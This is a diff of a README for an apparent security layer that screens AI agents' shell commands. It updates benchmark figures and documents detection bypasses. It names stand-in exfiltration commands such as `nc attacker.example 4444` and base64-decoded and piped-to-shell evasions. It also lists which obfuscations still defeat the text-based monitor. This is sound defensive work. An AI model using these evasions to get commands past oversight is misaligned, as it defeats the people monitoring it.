@@ -2,8 +2,6 @@
 
 [![CI](https://github.com/wcnjing/CodeJam/actions/workflows/ci.yml/badge.svg)](https://github.com/wcnjing/CodeJam/actions/workflows/ci.yml)
 
-<sub>The badge currently resolves from the `feat/evaluation-reliability` branch, which is where the workflow lives until it merges — it is not yet a statement about `main`. Do not over-read it before then.</sub>
-
 **The problem.** AI agents run real shell commands with real credentials and
 open networking — and today nobody can see, approve, or stop what they actually
 *do*. Prompt filters guard what you say to an agent; nothing guards what the
@@ -23,18 +21,26 @@ actually leave. Built on the CodeJam starter kit's Kill Switch track.
 
 | Policy-predicted over an authored corpus | No middleware | Sentinel |
 | --- | ---: | ---: |
-| Attacks the policy would allow | 100% | **1.0%** |
+| Attacks the policy would allow | 100% | **0.0%** (0/114) |
 | Secret-channel attacks allowed | 40/40 | **0/40** |
-| Legitimate tasks blocked | 0% | 1.3% |
+| Legitimate tasks blocked | 0% | 1.2% (1/84) |
 | Added per-command decision latency (p95) | — | **tens of µs** |
 
-*Figures from CI run
-[33294916979](https://github.com/wcnjing/CodeJam/actions/runs/33294916979); ranges
-span its three runners. Computed live in-app at **Security Evaluation**
-(`npm run bench` for the CLI). These are policy **decisions** on a corpus we
-authored, not observed execution — real-world bypasses exist (see Limitations); the physical
-"zero bytes left" claim comes from the live collector demo, not this table. The
-one residual — a fully base64-encoded command — is named, not hidden.*
+*Computed live in-app at **Security Evaluation**; `npm run bench:security` for
+the CLI, `npm run bench` for the full harness with provenance. Latency is
+hardware-dependent — read the figure your own run prints, not this row.*
+
+*Read the escape rate for what it is: a policy **decision** on a corpus we
+authored, not observed execution. 0.0% is corpus performance, and a corpus its
+own authors wrote cannot be evidence that no bypass exists — only that the ones
+we thought of are closed. The generated bank (`npm run bench:generate`,
+6,860 variants) exists because hand-authored cases have blind spots, and each of
+the three times its axes were widened it found live bypasses the corpus could
+not see. The residual documented
+here for most of this project's life — a fully base64-encoded command — is
+closed; see Limitations for what is still open, which is the part that matters.
+The physical "zero bytes left" claim comes from the live collector demo, not
+from this table.*
 
 Run it locally with Docker, Colima, or rootless Podman.
 
@@ -284,14 +290,14 @@ sidebar — computed on demand from the running policy engine, so the dashboard 
 never drift from what actually enforces. It reports the **policy-predicted escape
 rate**, secret-channel block rate, per-family coverage, and a
 baseline-vs-protected comparison. On the current corpus the predicted escape rate
-drops from 100% (no middleware) to 1.0% (one documented base64 residual, named
-not hidden), secret-channel attacks allowed from 40/40 to 0/40, with a p95
+drops from 100% (no middleware) to 0.0%, secret-channel attacks allowed from
+40/40 to 0/40, with a p95
 decision latency in the tens of microseconds (hardware-dependent; run the CLI on
 your own machine for the figure that applies to it).
 
 > **Honest scope.** This benchmark measures the policy **decision**, not observed
 > execution — it does not run containers or watch a collector. Its numbers are on
-> an authored corpus plus a retained external-review regression set, so 1.0% is
+> an authored corpus plus a retained external-review regression set, so 0.0% is
 > corpus performance, not an expected
 > real-world bypass rate (simple obfuscations still exist — see Limitations). The
 > physical proof that a byte never leaves is the separate **live mock-collector
@@ -458,6 +464,32 @@ been there — and those are now closed too:
 | detection | 3,416 / 3,430 | 5,383 / 5,488 | **5,488 / 5,488** (100.00%) |
 | accepted-bypass ratchet | 14 | 105 | **0** |
 
+**And then it happened a third time.** Merging the branches meant reviewing the
+axes again, and the wrapper axis had a gap of exactly the same shape: every
+wrapper *ran* the command, none *wrote* it and then ran what was written. So the
+bank could not express `echo '<command>' | sh` — the shortest bypass of the
+textual carve-out, simpler than any encoded form, and open on every branch. Four
+pipeline-sink wrappers took the bank from 5,488 to **6,860 variants** and
+surfaced 105 further bypasses, all `nc`/`socat`/`openssl`:
+
+| | before | after the fix |
+| --- | --- | ---: |
+| detection | 6,755 / 6,860 | **6,860 / 6,860** (100.00%) |
+| accepted-bypass ratchet | 105 | **0** |
+
+The structural reason is worth recording, because it is the same one twice: a
+URL survives any wrapper, since it matches anywhere in the text. A **bare host**
+does not — `attacker.example` is only recoverable as a destination because `nc`
+was recognised in argument position first. Any wrapper that breaks tool
+recognition therefore opens the bare-host class while leaving every URL-carrying
+variant untouched, and every variant the bank generated for those tools carried
+a URL. Withdrawing the carve-out fixed the URL half; the bare-host half needed
+the piped text materialised and re-examined as a command.
+
+Three widenings, three live bypasses found. The honest reading is not that the
+bank is now complete — it is that the axes are a hand-authored artefact like any
+other, and every time anyone has looked at them properly, something was missing.
+
 **Those 105 were a defect in the shipping product, not in this branch.** They were
 verified present on `main` before this branch touched anything, and the fix is in
 `main`'s own `shell-parse.ts`. `nc attacker.example 4444` was denied;
@@ -575,9 +607,16 @@ operational-controls mapping.
 
 Recorded honestly, because each one is a real gap:
 
-- **Detection is textual.** A fully encoded command
-  (`eval "$(echo <base64> | base64 -d)"`) defeats it. Only network-layer egress
-  control closes this, which was deliberately not attempted — see
+- **Detection is textual, and that ceiling has not moved.** The engine now
+  materialises what a command would decode (base64, hex, ANSI-C, printf octal)
+  or pipe into a shell, and asks the same question of that text, so
+  `eval "$(echo <base64> | base64 -d)"` and `echo 'curl https://x' | sh` are
+  both closed. This is a wider reach, not a different guarantee: it only works
+  because the decoder is named in the command and the payload is a literal. A
+  destination assembled at runtime, a blob fetched and then executed, or an
+  encoding nobody enumerated are all still invisible. Only network-layer egress
+  control removes the dependence on reading text at all, and that is still
+  deliberately not attempted — see
   [docs/KILL_SWITCH_PLAN.md](docs/KILL_SWITCH_PLAN.md).
 - **Containment versus prevention.** Confirmed against a live Ark endpoint:
   Codex emits `item.started` carrying the full command with `exit_code: null,
@@ -603,11 +642,15 @@ Recorded honestly, because each one is a real gap:
 
 ### Security Evaluation — measured live from the running policy engine
 
-Baseline-vs-Sentinel escape rate, secret-channel allow rate, per-family coverage (with the
-one residual named), classifier quality, and policy latency — computed on demand
-from the same engine that enforces, so it can never drift from what actually runs.
+Baseline-vs-Sentinel escape rate, secret-channel allow rate, per-family coverage,
+classifier quality, and policy latency — computed on demand from the same engine
+that enforces, so it can never drift from what actually runs.
 
-![Sentinel Security Evaluation dashboard: 100% to 1.0% policy-predicted escape rate, 0/39 secret-channel attacks allowed, per-family coverage, and the governance loop](docs/assets/security-evaluation.png)
+<sub>The screenshot below predates the current numbers (it shows the 1.0%
+base64 residual, since closed). The dashboard is computed live, so run it rather
+than reading figures off the image.</sub>
+
+![Sentinel Security Evaluation dashboard: baseline-vs-Sentinel policy-predicted escape rate, secret-channel attacks allowed, per-family coverage, and the governance loop](docs/assets/security-evaluation.png)
 
 ### Human approval — a held run awaiting a decision
 
